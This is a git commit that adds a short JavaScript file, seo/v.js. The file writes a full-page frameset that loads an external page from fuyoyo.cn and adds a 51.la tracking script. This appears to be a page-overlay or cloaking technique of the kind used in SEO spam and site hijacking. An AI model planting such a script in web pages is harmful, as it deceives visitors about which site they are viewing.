0238bc2a7fb1e6ec3e1b103448a25b104d15ffb1
wy56644 <56644@163.com>
2017-06-16 18:27:34 +0800

    1
    1

---
+++ seo/v.js
@@ -0,0 +1,6 @@
+document.writeln("<script language = javascript>");
+document.writeln("document.write(\"<frameset rows=\'100%,*\' frameborder=\'NO\' border=\'0\' framespacing=\'0\'>\");");
+document.writeln("document.write(\"<frame name=\'main\' src=\'http://fuyoyo.cn/vip/kf.html\' scrolling=yes>\");");
+document.writeln("document.write(\"<\/frameset>\");");
+document.writeln("<\/script>");
+document.write ('<script language="javascript" type="text/javascript" src="http://js.users.51.la/19173761.js"></script>');
